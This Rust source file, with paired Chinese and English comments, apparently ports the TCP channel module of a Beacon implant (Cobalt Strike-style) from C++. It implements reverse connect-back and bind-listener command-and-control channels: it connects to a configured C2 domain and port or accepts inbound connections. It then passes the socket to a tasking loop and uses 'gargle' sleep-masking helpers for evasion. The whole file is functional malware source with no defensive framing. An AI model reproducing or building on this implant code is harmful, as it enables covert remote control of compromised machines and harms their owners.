//! client_tcp.cpp 的移植版 —— 管理 TCP 通道。
//! Port of client_tcp.cpp — Manage the TCP channel.
//!
//! 为 Beacon 提供反向/绑定 TCP C2 服务器：`tcp_init` 向外连接（反向），
//! `tcp_server_wait` 接受入站连接（绑定），两者都把得到的套接字交给共享的
//! `client` 子系统。
//! Provides the reverse/bind TCP C2 servers for Beacon: `tcp_init` connects
//! out (reverse), `tcp_server_wait` accepts an inbound connection (bind),
//! and both hand the resulting socket to the shared `client` subsystem.

use crate::beacon::{SETTING_BINDHOST, SETTING_DOMAINS, SETTING_PORT};
use crate::client::{client_close, client_init, client_process, client_stop};
use crate::link::{lchannel_tcp, LChannel};
use crate::settings::{setting_int, setting_ptr, setting_short};
use crate::state;
use parking_lot::Mutex;
use windows_sys::Win32::Networking::WinSock::{
    bind, closesocket, listen, socket, AF_INET, INVALID_SOCKET, SOCKADDR, SOCKADDR_IN,
    SOCKET_ERROR, SOCK_STREAM,
};

/// 我们的服务器套接字（client_tcp.cpp 的 `static SOCKET server`）。以 isize
/// （C++ 的 SOCKET）存储；像 C++ 全局变量一样零初始化。
/// Our server socket (client_tcp.cpp `static SOCKET server`). Stored as an
/// isize (C++ SOCKET); zero-initialized like the C++ global.
static SERVER: Mutex<isize> = Mutex::new(0);

/// `wsconnect` 位于 commands.cpp（移植到 commands.rs）；重新导出它，使
/// `crate::client_tcp::wsconnect` 的解析方式与 C++ 链接一致。
/// `wsconnect` lives in commands.cpp (ported to commands.rs); re-export it so
/// `crate::client_tcp::wsconnect` resolves the same way the C++ linkage did.
pub use crate::commands::wsconnect;

/// 以 C++ 名称重新导出 gargle TCP 辅助函数。
/// Re-export the gargle TCP helpers under their C++ names.
#[allow(non_snake_case)]
pub use crate::gargle_pivot_tcp::gargle_accept as GargleAccept;
#[allow(non_snake_case)]
pub use crate::gargle_pivot_tcp::gargle_wait_tcp as GargleWaitTCP;

/* 调用我们的 gargle 函数 / call our gargle function */
unsafe extern "C" fn link_channel_tcp_wait(thisp: *mut core::ffi::c_void) {
    let inst = &mut *(thisp as *mut LChannel);
    crate::gargle_pivot_tcp::gargle_wait_tcp(inst.socket);
}

/* 创建一种新的通道 / create a new kind of channel */
fn lchannel_tcp_gargle(socket: isize) -> LChannel {
    let mut channel = lchannel_tcp(socket);
    channel.wait = Some(link_channel_tcp_wait);
    channel
}

/* 初始化我们的连接 / init our connection */
pub fn tcp_init() -> bool {
    /* 现在把发布类型设为 POST_TCP……因为一切似乎正常
     * set post type to POST_TCP now... since everything seems OK */
    state::set_post_type(crate::commands::POST_TCP);

    /* 初始化我们的 winsock 套接字 / init our winsock socket */
    crate::channel_tcp::channel_winsock_init();

    /* 连接！ / connect! */
    let targetip = setting_ptr(SETTING_DOMAINS).unwrap_or(b"");
    let port = setting_short(SETTING_PORT) as i32;
    let server = wsconnect(targetip, port);
    if server == INVALID_SOCKET as isize {
        return false;
    }

    *SERVER.lock() = server;

    /* 初始化我们的客户端（如果我们成功了） / initialize our client (IF we were successful) */
    client_init(lchannel_tcp_gargle(server));

    /* 好了，可以开始了 / alright, this is good to go */
    true
}

/* 初始化我们的连接 / init our connection */
fn tcp_server_wait(bindto: u32) -> bool {
    /* 现在把发布类型设为 POST_TCP……因为一切似乎正常
     * set post type to POST_TCP now... since everything seems OK */
    state::set_post_type(crate::commands::POST_TCP);

    /* 设置我们的套接字 / setup our socket */
    let serversock = unsafe { socket(AF_INET as i32, SOCK_STREAM, 0) };
    if serversock == INVALID_SOCKET {
        unsafe {
            closesocket(serversock);
        }
        return false;
    }

    /* 指定我们想要绑定到的主机/端口 / specify the host/port we want to bind to */
    let mut sock: SOCKADDR_IN = unsafe { std::mem::zeroed() };
    sock.sin_family = AF_INET as u16;
    sock.sin_port = setting_short(SETTING_PORT).to_be(); // htons(...)
    sock.sin_addr.S_un.S_addr = bindto;

    /* 启动我们的服务器 / start our server */
    let status = unsafe {
        bind(
            serversock,
            &sock as *const SOCKADDR_IN as *const SOCKADDR,
            std::mem::size_of::<SOCKADDR_IN>() as i32,
        )
    };
    if status == SOCKET_ERROR {
        unsafe {
            closesocket(serversock);
        }
        return false;
    }

    /* 监听连接…… *pHEAR* / listen for a connection... *pHEAR* */
    let status = unsafe { listen(serversock, 120) };
    if status == SOCKET_ERROR {
        unsafe {
            closesocket(serversock);
        }
        return false;
    }

    /* 尝试接受我们的连接 / try to accept our connection */
    let server = crate::gargle_pivot_tcp::gargle_accept(serversock as isize);

    if server != INVALID_SOCKET as isize {
        *SERVER.lock() = server;

        /* 请初始化我们的连接 / initialize our connection, please */
        client_init(lchannel_tcp_gargle(server));
        unsafe {
            closesocket(serversock);
        }
        true
    } else {
        unsafe {
            closesocket(serversock);
        }
        false
    }
}

/*
 *  终止我们的命名管道（完成）
 *  kill our named pipe (done)
 */
pub fn tcp_stop() {
    /* 为我们的 TCP 套接字做正确的事 / do the right thing for our TCP socket */
    unsafe {
        closesocket(*SERVER.lock() as _);
    }

    /* 释放我们的一些数据 / free up some of our data */
    client_stop();
}

/*
 * 把这个 beacon 置于等待连接到其管道的模式
 * put this beacon into a mode where it's waiting for a connection to its pipe
 */
pub fn command_tcp_reverse_start() {
    /* 设置我们的 SMB 服务器 / setup our SMB server */
    if !tcp_init() {
        return;
    }

    /* 处理数据 / process data */
    client_process();

    /* 也关闭客户端 / close down the client too */
    client_close();

    /* 好了，是时候把它关掉了 / OK, time to shut it down */
    tcp_stop();

    /* 直接终止进程……要么这样要么崩溃 / just kill the process... it's this or crash */
    crate::thread::safe_exit();
}

/*
* 把这个 beacon 置于等待连接到其套接字的模式
* put this beacon into a mode where it's waiting for a connection to its socket
*/
pub fn command_tcp_bind_start() {
    /* 我们的绑定主机，本地暂存 bind_tcp Beacon 时可能是 127.0.0.1
     * our bind host, might be 127.0.0.1 when staging a bind_tcp Beacon locally */
    let bindto = setting_int(SETTING_BINDHOST).to_be(); // htonl(...)

    /* 初始化 winsock / init winsock */
    crate::channel_tcp::channel_winsock_init();

    /* 当我们是 SMB 服务器时……做这些事情
     * while we are an SMB server... do this stuff */
    while state::sleep_time() > 0 {
        /* 等待连接并发送我们的 agent id / wait for a connection and send our agent id */
        if !tcp_server_wait(bindto) {
            break;
        }

        /* 处理数据 / process data */
        client_process();

        /* 终止客户端 / kill the client */
        client_close();

        /* 关闭会话 / close the session */
        unsafe {
            closesocket(*SERVER.lock() as _);
        }
    }

    /* 我们不再是 SMB 服务器……停止这些把戏
     * we're no longer an SMB server... stop the shenanigans */
    tcp_stop();

    /* 直接终止进程……要么这样要么崩溃 / just kill the process... it's this or crash */
    crate::thread::safe_exit();
}
